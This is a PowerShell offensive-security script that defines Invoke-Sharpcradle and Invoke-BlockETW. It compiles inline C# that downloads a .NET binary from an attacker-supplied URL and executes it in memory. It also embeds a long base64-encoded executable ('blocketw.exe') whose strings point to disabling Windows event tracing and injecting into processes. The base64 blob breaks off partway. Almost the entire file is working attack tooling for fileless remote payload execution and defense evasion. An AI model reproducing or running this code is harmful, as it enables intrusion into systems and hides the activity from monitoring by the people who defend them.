function Invoke-Sharpcradle
{
<#
    .DESCRIPTION
        Download .NET Binary to RAM.
        Credits to https://github.com/anthemtotheego for Sharpcradle in C#
        Author: @securethisshit
        License: BSD 3-Clause
    #>

Param
    (
        [string]
        $uri,
        [Parameter(ValueFromRemainingArguments)]
        [string[]]
        $arguments
    )

Invoke-BlockETW

$cradle = @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
namespace SharpCradle
{
    public class Program
    {
        public static void Main(params string[] args)
        {
            
          try
          {
          
            string url = args[0];
            
                
                object[] cmd = args.Skip(1).ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from the binary file
                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                    ms = new MemoryStream(client.DownloadData(url));
                    BinaryReader br = new BinaryReader(ms);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                    ms.Close();
                    br.Close();
                   loadAssembly(bin, cmd);
                }
            
          }//End try
          catch
          {
            Console.WriteLine("Something went wrong! Check parameters and make sure binary uses managed code");
          }//End catch
        }//End Main  
        
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {       
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);                    
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
        }
}
"@

Add-Type -TypeDefinition $cradle -Language CSharp

# Combine the URI and the additional arguments into a single array
$allArgs = @($uri) + $arguments

# Call the Main method with the combined arguments array
[SharpCradle.Program]::Main($allArgs)

}
function Invoke-BlockETW
{
    $base64binary="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAItqxqAAAAAAAAAAAOAAIgALATAAACQAAAAIAAAAAAAAEkIAAAAgAAAAYAAAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACgAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAL9BAABPAAAAAGAAAKwFAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAAAUQQAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAGCIAAAAgAAAAJAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKwFAAAAYAAAAAYAAAAmAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAALAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADzQQAAAAAAAEgAAAACAAUA7CAAACggAAADAAIAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBQBnAAAAAQAAESgQAAAKbxEAAAoKF40WAAABJRYgwwAAAJwLcgEAAHAoGAAABnIVAABwKBcAAAYMBggHjmlqKBIAAAofQBIDKBQAAAYmBggHB45pEgQoEwAABiYGCAeOaWooEgAACgkSBSgUAAAGJioeAigTAAAKKh4CKBMAAAoqHgIoEwAACioeAigTAAAKKh4CKBMAAAoqAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAACwNAAAjfgAAmA0AAFgPAAAjU3RyaW5ncwAAAADwHAAANAAAACNVUwAkHQAAEAAAACNHVUlEAAAANB0AAPQCAAAjQmxvYgAAAAAAAAACAAABVz0CFAkCAAAA+gEzABYAAAEAAAAXAAAAEwAAAFcAAAApAAAAnAAAABMAAAAeAAAAEgAAAAUAAAABAAAAAwAAACMAAAABAAAAAgAAABAAAAAAACgHAQAAAAAABgBtBucKBgDaBucKBgCCBagKDwAHCwAABgCqBcMJBgBBBsMJBgAiBsMJBgDBBsMJBgCNBsMJBgCmBsMJBgDBBcMJBgCWBcgKBgB0BcgKBgAFBsMJBgDcBZ0HBgBTDcUIBgAeCm0OBgAiBcUIBgBeBsUIBgDMCMUICgCiDKgKBgD4BsUIBgB7CsUIAAAAAFgAAAAAAAEAAQABABAAeAiODkEAAQABAAAAEAAgAHwDQQABAAMABQAQAA4AAABBAAEABAAFABAAvwgAAEEAAQAaAA0BEABXAQAASQABACkADQERAGsBAABJAAUAKQANAREA6QEAAEkAFwApAA0BEACcAQAASQAZACkADQEQAD0BAABJABwAKQANABAAJAEAAEEAIgApAA0BEAAJAQAASQAoACoADQEQABgBAABJACsAKgANARAAigEAAEkALgAqAA0BEABzAAAASQA0ACoABQEAAH8LAABRADYAKgAFAQAAsAEAAFEARAAqAAUBAACfCwAAUQBIACoABQEAAIANAABRAEsAKgADAGcMigADABIDigADAIQCjQADAFwCjQADAFACjQADAEMDkAADABQKkAADAE0EkAADAPcBjQADAC8CjQADADUHjQADAD0HjQADALoLjQADAMgLjQADAPUFjQADAJILjQADAHkOkwADACYAkwADADIAigADAFgOigADAGIOigADAFYKigADAAgKlgADAEgOigADAGkIjQADAGYKigADEDEEmgADADMNigADANAMigADAIQIigADAEoPigADAHQCnQADAGcCigADADMNoAADAN8MigADAJoCowADAIQInQADAE4PjQADAEoPjQADAGoIpwADABgIpwADADwKigADAGoIpwADABgIpwADADwKigADAGoIjQADADwPigADAMYEigADAGQLoAADAGgKigADAE4DigADAFkMigADAAUDigAGBjMCoABWgKQIqgBWgD0FqgBWgPgCqgBWgHQJqgBWgMECqgBWgEcFqgBWgLwDqgBWgEsMqgBWgEcCqgBWgFQJqgBWgGMJqgBWgP8IqgBWgJEHqgAGBjMCoABWgO8ErgBWgOEBrgBWgMMArgAGBjMCoABWgIgAsgBWgMsBsgAGBjMCoABWgL4AtgBWgPwAtgBWgGEAtgBWgOUAtgBWgBgCtgBWgL0BtgBWgPsBtgBWgNYAtgBWgAkCtgBWgH0AtgBWgJ8AtgBWgKwAtgBQIAAAAACWAOgIugABAMMgAAAAAIYYYAoGAAIAyyAAAAAAhhhgCgYAAgAAAAAAgACTIAwFwAACAAAAAACAAJMgFwnMAAYAAAAAAIAAkyAmDtUACQAAAAAAgACTIFoF3gANAAAAAACAAJMgcgzpABQAAAAAAIAAkyC8A/EAFwAAAAAAgACTIEsM/QAfAAAAAACAAJMgdwETASoAAAAAAIAAkyD+BBcBKgAAAAAAgACTID4NIgEwAAAAAACAAJMgCA4oATIAAAAAAIAAkyCwAygBMwAAAAAAgACTIPYOLQE0AAAAAACAAJMgBA8zATYAAAAAAIAAkyCcDj0BOwAAAAAAgACTIBYPRgFAAAAAAACAAJMg2Q5RAUUAAAAAAIAAkyB6BFsBSgAAAAAAgACTIOsCZQFOAAAAAACAAJYgqgxqAU8AAAAAAIAAliDqDnABUQDTIAAAAACGGGAKBgBSAAAAAACAAJMgfgx1AVIAAAAAAIAAkyC8DoABVwAAAAAAgACTIHAMkAFiAAAAAACAAJMgiwmdAWYAAAAAAIAAkyCbCaoBbQAAAAAAgACTIMQHuwF3AAAAAACAAJMgzAPDAXkAAAAAAIAAkyDZB84BfQAAAAAAgACTILkM2QGAAAAAAACAAJMgqw7kAYQAAAAAAIAAkyDTAvQBjwAAAAAAgACTIOQC/QGUAAAAAACAAJMgGgMEApYAAAAAAIAAliCuCQ4CmwDbIAAAAACGGGAKBgCdAOMgAAAAAIYYYAoGAJ0AAAABAJoLAgABAPQEAgACABcFAAADADkLAAAEAFMHAAABAFINAAACAH0IAAADAJILAAABAEgOAAACAO4NAAADAJILAAAEAFkHAAABAEgOAAACAJILAAADAO4GAAAEAP0GAAAFAEUHAAAGAAUHAAAHAEwHAAABAD0MAAACADEEAAADAJACACAAAAAAAAABAOoDAAACAKIDAAADAP8DAAAEACIEAAAFAB8MACAGADEEAAAHALALACAAAAAAAAABALQEAAACANYEAAADAEoLAAAEACYLAAAFABYLAAAGAG8LAAAHAMsNAAAIACkPAQAJAAYKAgAKACwJAAABAEAEAAACAEMKAAADAGAHAAAEALcCAAAFAJkIAAAGAGcDAAABAEAEAAACALsKAAABAEgOAAABAFINAAABAC0KAAACAHEIAAABAGcMAAACAO4MAAADACwKAAAEAHkHAAAFAKMCAAABAGcMAAACAAwNAAADAHkHAAAEACwFAAAFAHYNAAABAGcMAAACAO4MAAADACwKAAAEAFMHAgAFANEIAAABAGcMAAACAAwNAAADAHkHAAAEAJINAgAFAGcNAQABAGcMAQACAJILAgADAJQEAAAEAHcHAAABABIDAAABAGEEAAACAGkEAAABANEEAAABABQEAAACAAcMAAADAEEJAAAEAD4IAAAFAGQIAAABANYLAAACAJ4EAAADABAIAAAEACsPAAAFANgEAAAGAM0NAAAHAFUEAAAIAPoJAAAJAPAJAAAKADsCAAALAJQLAAABAAYEAAACACEMAAADAF4LAAAEAJoCAAABANUJAAACAC8MAAADAOkLAAAEAIkHAAAFAP8NAAAGAIMKAAAHAEcEAAABANwDAAACAAYEAAADAPAMAAAEACoNAAAFAGwHAAAGAJ8NAAAHAIAHAAAIAN0JAAAJAC4FAAAKAFoNAAABAP4HACACALcHAAABABAIAAACAJUKAAADAKwEAAAEANIDAAABAP4HAAACALcHAAADAPYHAAABAGEEAAACAHIEAAADAJEIAAAEAPwMAAABABIDAAACACEMAAADAF4LAAAEAAYEAAAFABYNAAAGAEoKAAAHADMDAAAIACUNAAAJALkNAAAKABUHAAALADUKAAABAJUDAAACAOQEAAADAAEAAAAEAD4AAAAFAEsAAAABAJUDAAACANkNAAABAJUDAAACAPALAAADAO0IAAAEACYIAAAFAFcIAAABAAYEAAACAPAMCQBgCgEAEQBgCgYAGQBgCgoAKQBgChAAMQBgChAAOQBgChAAQQBgChAASQBgChAAUQBgChAAWQBgChAAYQBgChUAaQBgChAAcQBgChAAeQBgChAAmQBgCgYAqQCYDCQAqQCKAykAuQCtDS0AgQBgCgYACQDcADsACQDgAEAACQDkAEUACQDoAEoACQDsAE8ACQDwAFQACQD0AFkACQD4AF4ACQD8AGMACQAAAWgACQAEAW0ACQAIAXIACQAMAXcACQAUAXwACQAYAUAACQAcAUUACQAkAUAACQAoAUUACQAwAXwACQA0AU8ACQA4AVQACQA8AVkACQBAAV4ACQBEAUAACQBIAUUACQBMAYEACQBQAUoACQBUAWMACQBYAWgACQBcAW0ALgALABQCLgATAB0CLgAbADwCLgAjAEUCLgArAFMCLgAzAFMCLgA7AFMCLgBDAEUCLgBLAFkCLgBTAFMCLgBbAFMCLgBjAHECLgBrAJsCLgBzAKgCAwJ7AEAAIwJ7AEAAQwJ7AEAAYwJ7AEAALwCGADYAhgA7AIYAPwCGAPEAiAAaAKgIFwC1CAABCQAMBQEAQAELABcJAQBAAQ0AJg4BAEABDwBaBQEAQAERAHIMAQBAARMAvAMBAAABFQBLDAEARgEXAHcBAQBAARkA/gQBAEABGwA+DQEAQAEdAAgOAQBAAR8AsAMBAAABIQD2DgEAAAEjAAQPAQAAASUAnA4BAEABJwAWDwEAAAEpANkOAQBAASsAegQBAAABLQDrAgEAAAEvAKoMAgAAATEA6g4CAAABNQB+DAMAAAE3ALwOAwAAATkAcAwDAAABOwCLCQMAAAE9AJsJAwAAAT8AxAcDAAABQQDMAwMAAAFDANkHAwAAAUUAuQwDAAABRwCrDgMAAAFJANMCAwAAAUsA5AIDAAABTQAaAwMAAAFPAK4JAwAEgAAAAQAAAAAAAAAAAAAAAACFDgAABAAAAAAAAAAAAAAAMgBTAgAAAAAEAAAAAAAAAAAAAAAyAMUIAAAAAAQAAwAFAAMABgADAAcAAwAIAAMACQADAAoAAwALAAMADAADAA0AAwAOAAMADwADABAAAwARAAMAEgADABMAAwAAAABBcGNBcmd1bWVudDEAS2VybmVsMzIAa2VybmVsMzIAV2luMzIAY2JSZXNlcnZlZDIAbHBSZXNlcnZlZDIAQXBjQXJndW1lbnQyAEFwY0FyZ3VtZW50MwA8TW9kdWxlPgBQQUdFX0VYRUNVVEVfUkVBRABDTElFTlRfSUQAUEFHRV9HVUFSRABEVVBMSUNBVEVfQ0xPU0VfU09VUkNFAFBBR0VfTk9DQUNIRQBQQUdFX1dSSVRFQ09NQklORQBOT05FAFBST1RFQ1RfRlJPTV9DTE9TRQBQQUdFX1JFQURXUklURQBQQUdFX0VYRUNVVEVfUkVBRFdSSVRFAFBBR0VfRVhFQ1VURQBVTklDT0RFX1NUUklORwBBTlNJX1NUUklORwBUSFJFQURfQkFTSUNfSU5GT1JNQVRJT04AUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgBQUk9DRVNTX0lORk9STUFUSU9OAFNUQVJUVVBJTkZPAEdldENvbnNvbGVPdXRwdXRDUABPQkpFQ1RfQVRUUklCVVRFUwBTRUNVUklUWV9BVFRSSUJVVEVTAEhBTkRMRV9GTEFHUwBQQUdFX05PQUNDRVNTAERVUExJQ0FURV9TQU1FX0FDQ0VTUwBJTkhFUklUAFNUQVJUVVBJTkZPRVgAZHdYAFBBR0VfUkVBRE9OTFkAUEFHRV9XUklURUNPUFkAUEFHRV9FWEVDVVRFX1dSSVRFQ09QWQBkd1kAdmFsdWVfXwBSdW50aW1lRGF0YQBTZXRRdW90YQBjYgBtc2NvcmxpYgBkd1RocmVhZElkAEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQAZHdQcm9jZXNzSWQAcHJvY2Vzc0lkAENsaWVudElkAGxwTnVtYmVyT2ZCeXRlc1JlYWQAYnl0ZXNSZWFkAFZpcnR1YWxNZW1vcnlSZWFkAE50UXVldWVBcGNUaHJlYWQATnRBbGVydFJlc3VtZVRocmVhZABDcmVhdGVUaHJlYWQAVW5pcXVlVGhyZWFkAGhUaHJlYWQATnRRdWVyeUluZm9ybWF0aW9uVGhyZWFkAENyZWF0ZVN1c3BlbmRlZABscFJlc2VydmVkAFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZQBCeXRlc0xlZnRUaGlzTWVzc2FnZQBBZ2VudC5QSW52b2tlAGdldF9IYW5kbGUAVGhyZWFkSGFuZGxlAGhTb3VyY2VIYW5kbGUAQ2xvc2VIYW5kbGUARHVwbGljYXRlSGFuZGxlAExkckdldERsbEhhbmRsZQBTZWN0aW9uSGFuZGxlAGhTb3VyY2VQcm9jZXNzSGFuZGxlAGhUYXJnZXRQcm9jZXNzSGFuZGxlAHByb2Nlc3NIYW5kbGUAbHBUYXJnZXRIYW5kbGUAYkluaGVyaXRIYW5kbGUAaGFuZGxlAGhGaWxlAGxwVGl0bGUAV2luZG93VGl0bGUAaE1vZHVsZQBwcm9jTmFtZQBNb2ROYW1lAFF1ZXJ5RnVsbFByb2Nlc3NJbWFnZU5hbWUAbHBFeGVOYW1lAEltYWdlUGF0aE5hbWUARGxsTmFtZQBscEFwcGxpY2F0aW9uTmFtZQBPYmplY3ROYW1lAG5hbWUAbHBDb21tYW5kTGluZQBBcGNSb3V0aW5lAE5vbmUAaFJlYWRQaXBlAFBlZWtOYW1lZFBpcGUAQ3JlYXRlUGlwZQBoV3JpdGVQaXBlAFZhbHVlVHlwZQBmbEFsbG9jYXRpb25UeXBlAFRlcm1pbmF0ZQBWaXJ0dWFsTWVtb3J5V3JpdGUAVXBkYXRlUHJvY1RocmVhZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBkd0ZpbGxBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBGbGFnc0F0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBscFZhbHVlAGxwUHJldmlvdXNWYWx1ZQBTaXplT2ZTdGFja1Jlc2VydmUAYmxvY2tldHcuZXhlAGR3WFNpemUAZHdZU2l6ZQBjYlNpemUAbHBSZXR1cm5TaXplAGxwU2l6ZQBuQnVmZmVyU2l6ZQBDb21taXRTaXplAGxwZHdTaXplAFZpZXdTaXplAE1heFNpemUAU3luY2hyb25pemUAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBTb3VyY2VTdHJpbmcAUnRsSW5pdFVuaWNvZGVTdHJpbmcAUnRsVW5pY29kZVN0cmluZ1RvQW5zaVN0cmluZwBBbGxvY2F0ZURlc3RpbmF0aW9uU3RyaW5nAERsbFBhdGgATWF4aW11bUxlbmd0aABUaHJlYWRJbmZvcm1hdGlvbkxlbmd0aABwcm9jZXNzSW5mb3JtYXRpb25MZW5ndGgAUmV0dXJuTGVuZ3RoAHJldHVybkxlbmd0aABsZW5ndGgAaG9vawBkd01hc2sAQWZmaW5pdHlNYXNrAE9yZGluYWwAYnl0ZXNBdmFpbABBbGwAa2VybmVsMzIuZGxsAG50ZGxsLmRsbABOdGRsbABTeXN0ZW0ARW51bQBscE51bWJlck9mQnl0ZXNXcml0dGVuAE1haW4AVGhyZWFkSW5mb3JtYXRpb24AUXVlcnlMaW1pdGVkSW5mb3JtYXRpb24AU2V0SGFuZGxlSW5mb3JtYXRpb24AbHBQcm9jZXNzSW5mb3JtYXRpb24AcHJvY2Vzc0luZm9ybWF0aW9uAFNldEluZm9ybWF0aW9uAFF1ZXJ5SW5mb3JtYXRpb24AVmlydHVhbE1lbW9yeU9wZXJhdGlvbgBOdENyZWF0ZVNlY3Rpb24ATnRNYXBWaWV3T2ZTZWN0aW9uAE50VW5tYXBWaWV3T2ZTZWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAHNlY3Rpb24ASW5oZXJpdERpc3Bvc2l0aW9uAFNoZWxsSW5mbwBEZXNrdG9wSW5mbwBscFN0YXJ0dXBJbmZvAGxwRGVza3RvcABTdHJpbmdCdWlsZGVyAGxwQnVmZmVyAGxwQnl0ZXNCdWZmZXIAYnVmZmVyAGxwUGFyYW1ldGVyAGhTdGRFcnJvcgAuY3RvcgBscFNlY3VyaXR5RGVzY3JpcHRvcgBVSW50UHRyAGFsbG9jYXRpb25BdHRyaWJzAERsbENoYXJhY3RlcmlzdGljcwBTeXN0ZW0uRGlhZ25vc3RpY3MAbWlsbGlzZWNvbmRzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGJJbmhlcml0SGFuZGxlcwBscFRocmVhZEF0dHJpYnV0ZXMAbHBQaXBlQXR0cmlidXRlcwBscFByb2Nlc3NBdHRyaWJ1dGVzAE9iamVjdEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAFByb2Nlc3NBY2Nlc3NGbGFncwBkd0ZsYWdzAGFyZ3MARHVwbGljYXRlT3B0aW9ucwBkd09wdGlvbnMAZHdYQ291bnRDaGFycwBkd1lDb3VudENoYXJzAHBQcm9jZXNzUGFyYW1ldGVycwBwQXR0cnMAVGhyZWFkSW5mb3JtYXRpb25DbGFzcwBwcm9jZXNzSW5mb3JtYXRpb25DbGFzcwBkd0Rlc2lyZWRBY2Nlc3MAZGVzaXJlZEFjY2VzcwBwcm9jZXNzQWNjZXNzAENyZWF0ZVByb2Nlc3MAVW5pcXVlUHJvY2VzcwBoUHJvY2VzcwBOdE9wZW5Qcm9jZXNzAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAR2V0UHJvY0FkZHJlc3MATGRyR2V0UHJvY2VkdXJlQWRkcmVzcwBQZWJCYXNlQWRkcmVzcwBUZWJCYXNlQWRkcmVzcwBscEJhc2VBZGRyZXNzAEZ1bmN0aW9uQWRkcmVzcwBscEFkZHJlc3MAbHBTdGFydEFkZHJlc3MAU3RhY2taZXJvQml0cwBFeGl0U3RhdHVzAFdhaXRGb3JTaW5nbGVPYmplY3QAaE9iamVjdABXaW4zMlByb3RlY3QAbHBmbE9sZFByb3RlY3QAZmxQcm90ZWN0AEFsbG9jYXRpb25Qcm90ZWN0AGZsTmV3UHJvdGVjdABTZWN0aW9uT2Zmc2V0AG9wX0V4cGxpY2l0AFNpemVPZlN0YWNrQ29tbWl0AGxwRW52aXJvbm1lbnQAUHJldmlvdXNTdXNwZW5kQ291bnQAZHdBdHRyaWJ1dGVDb3VudABwYWdlUHJvdABEZWxldGVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdABJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QAbHBBdHRyaWJ1dGVMaXN0AGhTdGRJbnB1dABoU3RkT3V0cHV0AFN5c3RlbS5UZXh0AHdTaG93V2luZG93AGJsb2NrZXR3AEFnZW50Lmhvb2tldHcAVmlydHVhbEFsbG9jRXgATnRDcmVhdGVUaHJlYWRFeABSdGxDcmVhdGVQcm9jZXNzUGFyYW1ldGVyc0V4AFZpcnR1YWxQcm90ZWN0RXgATG9hZExpYnJhcnkAUnRsWmVyb01lbW9yeQBSZWFkUHJvY2Vzc01lbW9yeQBXcml0ZVByb2Nl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SQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEfAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAWAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAADoACQABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABiAGwAbwBjAGsAZQB0AHcAAAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAADoADQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAYgBsAG8AYwBrAGUAdAB3AC4AZQB4AGUAAAAAAEgAEgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAqQAgACAAMgAwADIAMAAAACoAAQABAEwAZQBnAGEAbABUAHIAYQBkAGUAbQBhAHIAawBzAAAAAAAAAAAAQgANAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAGIAbABvAGMAawBlAHQAdwAuAGUAeABlAAAAAAAyAAkAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAGIAbABvAGMAawBlAHQAdwAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAvGMAAOoBAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCg0KPGFzc2VtYmx5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MSIgbWFuaWZlc3RWZXJzaW9uPSIxLjAiPg0KICA8YXNzZW1ibHlJZGVudGl0eSB2ZXJzaW9uPSIxLjAuMC4wIiBuYW1lPSJNeUFwcGxpY2F0aW9uLmFwcCIvPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MiI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAgPHJlcXVlc3RlZFByaXZpbGVnZXMgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYzIj4NCiAgICAgICAgPHJlcXVlc3RlZEV4ZWN1dGlvbkxldmVsIGxldmVsPSJhc0ludm9rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdH